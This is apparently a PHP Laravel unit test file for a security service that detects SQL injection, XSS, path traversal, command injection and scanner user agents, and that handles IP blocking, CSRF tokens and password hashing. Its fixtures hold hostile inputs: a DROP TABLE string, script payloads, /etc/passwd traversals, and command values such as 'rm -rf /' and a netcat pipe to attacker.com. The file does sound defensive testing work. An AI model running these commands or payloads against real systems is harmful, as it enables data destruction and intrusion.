<?php

namespace Tests\Unit\Services;

use App\Services\SecurityService;
use Illuminate\Foundation\Testing\RefreshDatabase;
use Illuminate\Support\Facades\Cache;
use Illuminate\Support\Facades\Log;
use Tests\TestCase;

class SecurityServiceTest extends TestCase
{
    use RefreshDatabase;

    private SecurityService $securityService;

    protected function setUp(): void
    {
        parent::setUp();
        $this->securityService = new SecurityService();
    }

    public function test_can_detect_sql_injection_patterns(): void
    {
        // Arrange
        $maliciousInputs = [
            "'; DROP TABLE users; --",
            "1' OR '1'='1",
            "admin'--",
            "1' UNION SELECT * FROM users--",
            "'; INSERT INTO users VALUES('hacker', 'password'); --",
        ];

        $safeInputs = [
            "normal text",
            "user@example.com",
            "password123",
            "John's car",
        ];

        // Act & Assert - Malicious inputs should be detected
        foreach ($maliciousInputs as $input) {
            $this->assertTrue(
                $this->securityService->detectSqlInjection($input),
                "Failed to detect SQL injection in: {$input}"
            );
        }

        // Act & Assert - Safe inputs should not be detected
        foreach ($safeInputs as $input) {
            $this->assertFalse(
                $this->securityService->detectSqlInjection($input),
                "False positive for safe input: {$input}"
            );
        }
    }

    public function test_can_detect_xss_patterns(): void
    {
        // Arrange
        $maliciousInputs = [
            "<script>alert('XSS')</script>",
            "<img src=x onerror=alert('XSS')>",
            "javascript:alert('XSS')",
            "<svg onload=alert('XSS')>",
            "<iframe src='javascript:alert(\"XSS\")'></iframe>",
            "onmouseover=alert('XSS')",
        ];

        $safeInputs = [
            "normal text",
            "<p>Safe HTML content</p>",
            "<strong>Bold text</strong>",
            "user@example.com",
        ];

        // Act & Assert - Malicious inputs should be detected
        foreach ($maliciousInputs as $input) {
            $this->assertTrue(
                $this->securityService->detectXss($input),
                "Failed to detect XSS in: {$input}"
            );
        }

        // Act & Assert - Safe inputs should not be detected
        foreach ($safeInputs as $input) {
            $this->assertFalse(
                $this->securityService->detectXss($input),
                "False positive for safe input: {$input}"
            );
        }
    }

    public function test_can_detect_path_traversal_patterns(): void
    {
        // Arrange
        $maliciousInputs = [
            "../../../etc/passwd",
            "..\\..\\windows\\system32\\config\\sam",
            "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
            "....//....//....//etc/passwd",
            "..%252f..%252f..%252fetc%252fpasswd",
        ];

        $safeInputs = [
            "normal-file.txt",
            "documents/report.pdf",
            "images/photo.jpg",
            "folder/subfolder/file.doc",
        ];

        // Act & Assert - Malicious inputs should be detected
        foreach ($maliciousInputs as $input) {
            $this->assertTrue(
                $this->securityService->detectPathTraversal($input),
                "Failed to detect path traversal in: {$input}"
            );
        }

        // Act & Assert - Safe inputs should not be detected
        foreach ($safeInputs as $input) {
            $this->assertFalse(
                $this->securityService->detectPathTraversal($input),
                "False positive for safe input: {$input}"
            );
        }
    }

    public function test_can_detect_command_injection_patterns(): void
    {
        // Arrange
        $maliciousInputs = [
            "file.txt; rm -rf /",
            "file.txt && cat /etc/passwd",
            "file.txt | nc attacker.com 4444",
            "file.txt `whoami`",
            "file.txt $(id)",
            "file.txt & ping google.com",
        ];

        $safeInputs = [
            "normal-file.txt",
            "document with spaces.pdf",
            "file_name_123.doc",
            "report-2024.xlsx",
        ];

        // Act & Assert - Malicious inputs should be detected
        foreach ($maliciousInputs as $input) {
            $this->assertTrue(
                $this->securityService->detectCommandInjection($input),
                "Failed to detect command injection in: {$input}"
            );
        }

        // Act & Assert - Safe inputs should not be detected
        foreach ($safeInputs as $input) {
            $this->assertFalse(
                $this->securityService->detectCommandInjection($input),
                "False positive for safe input: {$input}"
            );
        }
    }

    public function test_can_detect_suspicious_user_agents(): void
    {
        // Arrange
        $suspiciousUserAgents = [
            "sqlmap/1.0",
            "Nikto/2.1.6",
            "Mozilla/5.0 (compatible; Nmap Scripting Engine)",
            "w3af.org",
            "ZAP/2.10.0",
            "Burp Suite",
            "python-requests/2.25.1",
            "curl/7.68.0",
            "wget/1.20.3",
        ];

        $normalUserAgents = [
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36",
            "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36",
            "Mozilla/5.0 (iPhone; CPU iPhone OS 14_7_1 like Mac OS X)",
        ];

        // Act & Assert - Suspicious user agents should be detected
        foreach ($suspiciousUserAgents as $userAgent) {
            $this->assertTrue(
                $this->securityService->isSuspiciousUserAgent($userAgent),
                "Failed to detect suspicious user agent: {$userAgent}"
            );
        }

        // Act & Assert - Normal user agents should not be detected
        foreach ($normalUserAgents as $userAgent) {
            $this->assertFalse(
                $this->securityService->isSuspiciousUserAgent($userAgent),
                "False positive for normal user agent: {$userAgent}"
            );
        }
    }

    public function test_can_track_threat_score(): void
    {
        // Arrange
        $ip = '192.168.1.100';
        Cache::flush();

        // Act
        $this->securityService->increaseThreatScore($ip, 10);
        $this->securityService->increaseThreatScore($ip, 15);

        // Assert
        $this->assertEquals(25, $this->securityService->getThreatScore($ip));
    }

    public function test_can_block_high_threat_ips(): void
    {
        // Arrange
        $ip = '192.168.1.100';
        Cache::flush();

        // Act
        $this->securityService->increaseThreatScore($ip, 100); // High threat score

        // Assert
        $this->assertTrue($this->securityService->isBlocked($ip));
    }

    public function test_can_whitelist_ips(): void
    {
        // Arrange
        $ip = '192.168.1.100';
        Cache::flush();

        // Act
        $this->securityService->addToWhitelist($ip);
        $this->securityService->increaseThreatScore($ip, 100);

        // Assert
        $this->assertFalse($this->securityService->isBlocked($ip));
        $this->assertTrue($this->securityService->isWhitelisted($ip));
    }

    public function test_can_blacklist_ips(): void
    {
        // Arrange
        $ip = '192.168.1.100';
        Cache::flush();

        // Act
        $this->securityService->addToBlacklist($ip);

        // Assert
        $this->assertTrue($this->securityService->isBlocked($ip));
        $this->assertTrue($this->securityService->isBlacklisted($ip));
    }

    public function test_can_detect_brute_force_attempts(): void
    {
        // Arrange
        $ip = '192.168.1.100';
        Cache::flush();

        // Act - Simulate multiple failed login attempts
        for ($i = 0; $i < 6; $i++) {
            $this->securityService->recordFailedLogin($ip);
        }

        // Assert
        $this->assertTrue($this->securityService->isBruteForceAttempt($ip));
    }

    public function test_can_reset_failed_login_attempts(): void
    {
        // Arrange
        $ip = '192.168.1.100';
        Cache::flush();

        // Act
        for ($i = 0; $i < 3; $i++) {
            $this->securityService->recordFailedLogin($ip);
        }
        $this->securityService->resetFailedLogins($ip);

        // Assert
        $this->assertFalse($this->securityService->isBruteForceAttempt($ip));
    }

    public function test_can_validate_file_upload_security(): void
    {
        // Arrange
        $allowedTypes = ['image/jpeg', 'image/png', 'application/pdf'];
        $maxSize = 5 * 1024 * 1024; // 5MB

        // Act & Assert - Valid files
        $this->assertTrue($this->securityService->validateFileUpload(
            'image.jpg',
            'image/jpeg',
            1024 * 1024, // 1MB
            $allowedTypes,
            $maxSize
        ));

        // Act & Assert - Invalid file type
        $this->assertFalse($this->securityService->validateFileUpload(
            'script.php',
            'application/x-php',
            1024,
            $allowedTypes,
            $maxSize
        ));

        // Act & Assert - File too large
        $this->assertFalse($this->securityService->validateFileUpload(
            'large.jpg',
            'image/jpeg',
            10 * 1024 * 1024, // 10MB
            $allowedTypes,
            $maxSize
        ));

        // Act & Assert - Dangerous file extension
        $this->assertFalse($this->securityService->validateFileUpload(
            'image.jpg.php',
            'image/jpeg',
            1024,
            $allowedTypes,
            $maxSize
        ));
    }

    public function test_can_sanitize_input(): void
    {
        // Arrange
        $maliciousInput = "<script>alert('XSS')</script><p>Normal content</p>";
        $expectedOutput = "&lt;script&gt;alert(&apos;XSS&apos;)&lt;/script&gt;&lt;p&gt;Normal content&lt;/p&gt;";

        // Act
        $sanitized = $this->securityService->sanitizeInput($maliciousInput);

        // Assert
        $this->assertEquals($expectedOutput, $sanitized);
    }

    public function test_can_generate_csrf_token(): void
    {
        // Act
        $token1 = $this->securityService->generateCsrfToken();
        $token2 = $this->securityService->generateCsrfToken();

        // Assert
        $this->assertNotEmpty($token1);
        $this->assertNotEmpty($token2);
        $this->assertNotEquals($token1, $token2);
        $this->assertEquals(64, strlen($token1)); // SHA256 hash length
    }

    public function test_can_validate_csrf_token(): void
    {
        // Arrange
        $token = $this->securityService->generateCsrfToken();
        $this->securityService->storeCsrfToken($token);

        // Act & Assert
        $this->assertTrue($this->securityService->validateCsrfToken($token));
        $this->assertFalse($this->securityService->validateCsrfToken('invalid-token'));
    }

    public function test_can_encrypt_and_decrypt_data(): void
    {
        // Arrange
        $plaintext = "Sensitive data that needs encryption";

        // Act
        $encrypted = $this->securityService->encryptData($plaintext);
        $decrypted = $this->securityService->decryptData($encrypted);

        // Assert
        $this->assertNotEquals($plaintext, $encrypted);
        $this->assertEquals($plaintext, $decrypted);
    }

    public function test_can_hash_password_securely(): void
    {
        // Arrange
        $password = "MySecurePassword123!";

        // Act
        $hash1 = $this->securityService->hashPassword($password);
        $hash2 = $this->securityService->hashPassword($password);

        // Assert
        $this->assertNotEquals($password, $hash1);
        $this->assertNotEquals($hash1, $hash2); // Different salts
        $this->assertTrue($this->securityService->verifyPassword($password, $hash1));
        $this->assertTrue($this->securityService->verifyPassword($password, $hash2));
        $this->assertFalse($this->securityService->verifyPassword('wrong-password', $hash1));
    }

    public function test_can_generate_secure_random_string(): void
    {
        // Act
        $random1 = $this->securityService->generateSecureRandomString(32);
        $random2 = $this->securityService->generateSecureRandomString(32);

        // Assert
        $this->assertEquals(32, strlen($random1));
        $this->assertEquals(32, strlen($random2));
        $this->assertNotEquals($random1, $random2);
        $this->assertMatchesRegularExpression('/^[a-zA-Z0-9]+$/', $random1);
    }

    public function test_can_validate_ip_address(): void
    {
        // Arrange
        $validIps = ['192.168.1.1', '10.0.0.1', '172.16.0.1', '8.8.8.8'];
        $invalidIps = ['256.256.256.256', '192.168.1', 'not-an-ip', ''];

        // Act & Assert - Valid IPs
        foreach ($validIps as $ip) {
            $this->assertTrue(
                $this->securityService->isValidIpAddress($ip),
                "Failed to validate IP: {$ip}"
            );
        }

        // Act & Assert - Invalid IPs
        foreach ($invalidIps as $ip) {
            $this->assertFalse(
                $this->securityService->isValidIpAddress($ip),
                "False positive for invalid IP: {$ip}"
            );
        }
    }

    public function test_can_check_rate_limiting(): void
    {
        // Arrange
        $key = 'test-rate-limit';
        $maxAttempts = 5;
        $decayMinutes = 1;
        Cache::flush();

        // Act & Assert - Within rate limit
        for ($i = 0; $i < $maxAttempts; $i++) {
            $this->assertFalse($this->securityService->isRateLimited($key, $maxAttempts, $decayMinutes));
            $this->securityService->incrementRateLimit($key, $decayMinutes);
        }

        // Act & Assert - Exceeded rate limit
        $this->assertTrue($this->securityService->isRateLimited($key, $maxAttempts, $decayMinutes));
    }

    public function test_can_log_security_event(): void
    {
        // Arrange
        Log::shouldReceive('channel')
            ->with('security')
            ->once()
            ->andReturnSelf();

        Log::shouldReceive('warning')
            ->once()
            ->with('Security Event: Test event', [
                'ip' => '192.168.1.1',
                'user_agent' => 'Test Agent',
                'details' => ['test' => 'data']
            ]);

        // Act
        $this->securityService->logSecurityEvent(
            'Test event',
            '192.168.1.1',
            'Test Agent',
            ['test' => 'data']
        );

        // Assert is handled by the shouldReceive expectations
    }

    public function test_can_clean_expired_threat_scores(): void
    {
        // Arrange
        $ip1 = '192.168.1.1';
        $ip2 = '192.168.1.2';
        Cache::flush();

        // Set threat scores with different expiry times
        Cache::put("threat_score:{$ip1}", 50, now()->subMinutes(10)); // Expired
        Cache::put("threat_score:{$ip2}", 30, now()->addMinutes(10)); // Not expired

        // Act
        $this->securityService->cleanExpiredThreatScores();

        // Assert
        $this->assertEquals(0, $this->securityService->getThreatScore($ip1));
        $this->assertEquals(30, $this->securityService->getThreatScore($ip2));
    }

    public function test_can_get_security_statistics(): void
    {
        // Arrange
        Cache::flush();
        $this->securityService->increaseThreatScore('192.168.1.1', 50);
        $this->securityService->increaseThreatScore('192.168.1.2', 80);
        $this->securityService->addToBlacklist('192.168.1.3');

        // Act
        $stats = $this->securityService->getSecurityStatistics();

        // Assert
        $this->assertIsArray($stats);
        $this->assertArrayHasKey('total_threats', $stats);
        $this->assertArrayHasKey('blocked_ips', $stats);
        $this->assertArrayHasKey('high_threat_ips', $stats);
        $this->assertGreaterThanOrEqual(0, $stats['total_threats']);
    }
}